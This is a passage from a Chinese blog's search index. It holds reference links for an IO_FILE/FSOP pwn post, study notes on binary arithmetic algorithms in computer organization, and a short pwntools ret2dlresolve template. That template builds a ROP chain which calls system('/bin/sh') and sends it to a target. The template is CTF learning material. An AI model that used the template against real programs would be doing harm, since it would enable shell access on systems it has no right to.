class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/16070118.html">https://www.cnblogs.com/LynneHuan/p/16070118.html</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write</a></p><p><a href="https://forum.butian.net/share/1516">https://forum.butian.net/share/1516</a></p><p><a href="https://www.shuzhiduo.com/A/gVdnM6DD5W/">https://www.shuzhiduo.com/A/gVdnM6DD5W/</a></p><p><a href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">https://www.cnblogs.com/pwnfeifei/p/15793432.html</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#fsop">https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#fsop</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-4.13_io_file.md">https://www.bookstack.cn/read/CTF-All-In-One/doc-4.13_io_file.md</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机组二进制运算总结</title>
      <link href="/posts/45720.html"/>
      <url>/posts/45720.html</url>
      
        <content type="html"><![CDATA[<h2 id="加法减法运算"><a href="#加法减法运算" class="headerlink" title="加法减法运算"></a>加法减法运算</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[X]补 + [Y]补 = [X+Y]补[X]补 - [Y]补 = [X-Y]补进位产生的超出机器字长的部分，舍掉（被模掉了）溢出判断方法：单符号位判断法：    结果符号判断法：        同号相加：结果符号与被加数相异则溢出        异号相减：结果符号与被减数相异则溢出    进位符号判断法：        数值最高进位值与符号位进位相异则溢出双符号位判别法（通过实现变形补码实现）：    双符号位参与运算，结果双符号位相异则溢出    00：正数11：负数01：正溢出10：负溢出    第一位符号位为运算结果的真正符号位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="浮点数表示范围"><a href="#浮点数表示范围" class="headerlink" title="浮点数表示范围"></a>浮点数表示范围</h2><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004244.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004323.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004558.png" alt="微信图片_20220505004558"></p><h2 id="乘法运算"><a href="#乘法运算" class="headerlink" title="乘法运算"></a>乘法运算</h2><h3 id="原码乘法"><a href="#原码乘法" class="headerlink" title="原码乘法"></a>原码乘法</h3><h4 id="原码一位乘法"><a href="#原码一位乘法" class="headerlink" title="原码一位乘法"></a>原码一位乘法</h4><pre class="line-numbers language-none"><code class="language-none">符号位单独处理：X0⊕Y0乘数当前末位为0，加0后部分积右移一位；乘数当前末位为1，加|X|后部分积右移一位。最后一次相加后的结果也要右移，有几位就要右移几次部分积采用双符号位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505005230.png"></p><h4 id="原码两位乘法"><a href="#原码两位乘法" class="headerlink" title="原码两位乘法"></a>原码两位乘法</h4><pre class="line-numbers language-none"><code class="language-none">1.原码两位乘法和原码一位乘法一样，符号位不参加运算2.部分积和被乘数x均采用三位符号，乘数y末位每次要加一个c，c一开始是03.根据如下法则进行运算：    · 000 -》 部分积加0，   右移两位，c变为0    · 001 -》 部分积加|x|， 右移两位，c变为0    · 010 -》 部分积加|x|， 右移两位，c变为0    · 011 -》 部分积加2|x|，右移两位，c变为0    · 100 -》 部分积加2|x|，右移两位，c变为0    · 101 -》 部分积减|x|， 右移两位，c变为1    · 110 -》 部分积减|x|， 右移两位，c变为1    · 111 -》 部分积加0，   右移两位，c变为1        其中减|x|等价于加[-|X|]补，因此在计算前，需要准备|X|（用三符号位）,2|X|（用三符号位）,[-|X|]补（用三符号位） 和 |Y|（用单符号位）,4.而乘数y用双符号还是单符号表示得根据乘数y的数值的奇偶性判断，而且最后一步移位与否也与乘数y的数值的奇偶性有关：    · 如果乘数y的尾数n的位数为偶数，则乘数y用双符号表示，最后一步不移位    · 如果乘数y的尾数n的位数为奇数，则乘数y用单符号表示，最后一步要移一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505010727.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505010730.png"></p><h3 id="定点数补码乘法"><a href="#定点数补码乘法" class="headerlink" title="定点数补码乘法"></a>定点数补码乘法</h3><p>补码乘法：符号位在运算中同时产生（不需要单独运算）</p><h4 id="定点数补码一位乘"><a href="#定点数补码一位乘" class="headerlink" title="定点数补码一位乘"></a>定点数补码一位乘</h4><h5 id="校正法"><a href="#校正法" class="headerlink" title="校正法"></a>校正法</h5><pre class="line-numbers language-none"><code class="language-none">乘数的补码 [Y]补 去掉符号位，当成正数与被乘数 [X]补 按照同原码一致的方法相乘两个n位数相乘，共做n次加法和n次移位部分积采用双符号位右移时按照补码的规则进行（左边补符号位）*乘数为负数时，最后求出的部分 +[-X]补 进行修正，但是不进行移位操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505012124.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505012128.png"></p><h5 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h5><pre class="line-numbers language-none"><code class="language-none">部分积和被乘数使用双符号位，乘数采用一位符号位需要在乘数的末位加上一位附加位，附加位初始值为0，Yn+1&#x3D;0通过比较末两位决定操作： 若Yn＋1＜Yn，部分积＋[-X]补，     若Yn＋1＝Yn，部分积＋0，     若Yn＋1＞Yn，部分积＋[X]补。          若Yn&#x3D;0，Yn+1&#x3D;0，部分积＋0，右移     若Yn&#x3D;0，Yn+1&#x3D;1，部分积＋[X]补，右移     若Yn&#x3D;1，Yn+1&#x3D;0，部分积＋[-X]补，右移     若Yn&#x3D;1，Yn+1&#x3D;1，部分积＋0，右移     最后一次加法运算不移位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505013239.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505013145.png"></p><h4 id="定点数补码两位乘（比较法）"><a href="#定点数补码两位乘（比较法）" class="headerlink" title="定点数补码两位乘（比较法）"></a>定点数补码两位乘（比较法）</h4><pre class="line-numbers language-none"><code class="language-none">补码两位乘法，根据附加位和部分积后两位值的情况，确定下一步操作。即根据当前的Yn-1,Yn,Yn+1的值，来确定下一步的操作。组合值为（Yn+Yn+1-2*Yn-1），组合值为a，就加上a*[X]补<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014225.png" alt="微信图片_20220505014225"></p><p>太不好解释了，直接粘贴ppt了</p><p>补码两位乘比较法规则说明</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014227.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014230.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014232.png" alt="微信图片_20220505014232"></p><h2 id="二进制除法运算"><a href="#二进制除法运算" class="headerlink" title="二进制除法运算"></a>二进制除法运算</h2><h3 id="定点原码一位除"><a href="#定点原码一位除" class="headerlink" title="定点原码一位除"></a>定点原码一位除</h3><h4 id="恢复余数法"><a href="#恢复余数法" class="headerlink" title="恢复余数法"></a>恢复余数法</h4><pre class="line-numbers language-none"><code class="language-none">符号位单独处理，C0&#x3D;X0⊕Y0,运算时采用绝对值进行运算。要求|X|&lt;|Y|,否则溢出|X|-|Y|&#x3D;R0,若R0&lt;0;商0，然后R0+|Y|,恢复余数，运算完后左移一位|X|-|Y|&#x3D;R0,若R0&gt;&#x3D;0;商1，运算完后左移一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>恢复余数法规则：</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015553.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015555.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015558.png"></p><h4 id="加减交替法"><a href="#加减交替法" class="headerlink" title="加减交替法"></a>加减交替法</h4><pre class="line-numbers language-none"><code class="language-none">与恢复余数法不同的是，在每次运算完成后，判断余数R0的正负。若R0&gt;&#x3D;0，上1，余数左移一位，减去|Y0|（等价于 +[-|Y0|]补 ），余数为正数，表明上一步够减，因此减去|Y0|；若R0&lt;0，上0，余数左移一位，加上|Y0|，余数为负数，表明上一步不够减，因此加上|Y0|。最开始运算为|X0|-|Y0|。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原码一位除加减交替法规则</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020432.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020435.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020438.png"></p><h3 id="定点补码一位除"><a href="#定点补码一位除" class="headerlink" title="定点补码一位除"></a>定点补码一位除</h3><h4 id="加减交替法-1"><a href="#加减交替法-1" class="headerlink" title="加减交替法"></a>加减交替法</h4><pre class="line-numbers language-none"><code class="language-none">被除数采用双符号位，除数采用单符号位。第一步根据除数与被除数的符号来进行下一步操作：    被除数与除数同号，[X]补-[Y]补    被除数与除数异号，[X]补+[Y]补第二步（之后）根据余数和除数的符号判断下一步操作：    余除同号，上商1，左移一位，-[Y]补    余除异号，上商0，左移一位，+[Y]补补码除法求商有误差，求出来的商为反码，需要对商进行修正，一般末位恒置一余数也需要进行修正，余数与被除数符号一致。不一致时，需要恢复余数。若为正商，余除异号，[Ri+1]补+[Y]补；若为负商，余除同号，[Ri+1]补-[Y]补。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022411.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022414.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022417.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022420.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022423.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022426.png"></p><h4 id="比较法-1"><a href="#比较法-1" class="headerlink" title="比较法"></a>比较法</h4><pre class="line-numbers language-none"><code class="language-none">和加减交替法基本上一致，但是改进了第一步的判断。将第一步的被除数看做余数，直接与除数比较，采用统一的上商计算方法。（第一步上来就根据被除数正负上商，并左移）规则：    余除同号，上商1，左移一位，-[Y]补（减去除数）    余除异号，上商0，左移一位，+[Y]补（加上除数）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505023227.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505023230.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="乘法文章推荐"><a href="#乘法文章推荐" class="headerlink" title="乘法文章推荐"></a>乘法文章推荐</h3><p><a href="https://blog.csdn.net/qq_43309315/article/details/107582972">https://blog.csdn.net/qq_43309315/article/details/107582972</a></p><h3 id="除法文章推荐"><a href="#除法文章推荐" class="headerlink" title="除法文章推荐"></a>除法文章推荐</h3><p><a href="https://blog.csdn.net/qq_45954145/article/details/118405136">https://blog.csdn.net/qq_45954145/article/details/118405136</a></p><p><a href="https://blog.csdn.net/qq_45954145/article/details/118405462">https://blog.csdn.net/qq_45954145/article/details/118405462</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools构造ret2dlresolve模板</title>
      <link href="/posts/1010.html"/>
      <url>/posts/1010.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwntools构造ret2dlresolve模板"><a href="#pwntools构造ret2dlresolve模板" class="headerlink" title="pwntools构造ret2dlresolve模板"></a>pwntools构造ret2dlresolve模板</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:class Ret2dlresolvePayload(__builtin__.object) |  Methods defined here: |   |  __init__(self, elf, symbol, args, data_addr&#x3D;None) |   |  ---------------------------------------------------------------------- |  Data descriptors defined here: |   |  __dict__ |      dictionary for instance variables (if defined) |   |  __weakref__ |      list of weak references to the object (if defined)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>elf：相应的文件</p><p>symbol：函数名称</p><p>args：函数参数</p><p>data_addr：该payload所在的地址(默认会会放在bss比较高的地址上)</p><p>常用方法（用之前要设置context.binary和elf）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dlresolve &#x3D; Ret2dlresolvePayload(elf,symbol&#x3D;&quot;system&quot;,args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;],data_addr&#x3D;0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>print(rop.dump())可以查看rop链内容</p><p>以上来自TTYflag师傅的介绍</p><p>在使用前先指定</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop&#x3D;ROP(&quot;.&#x2F;pwn&quot;)#pwntools模板dlresolve &#x3D; Ret2dlresolvePayload(elf, symbol&#x3D;&quot;system&quot;, args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;])rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)info(rop.dump()) #查看rop信息payload&#x3D;fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;)#0x4c是写入rop链的地方，0x100是read读入的大小。#fit就是填充一下r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
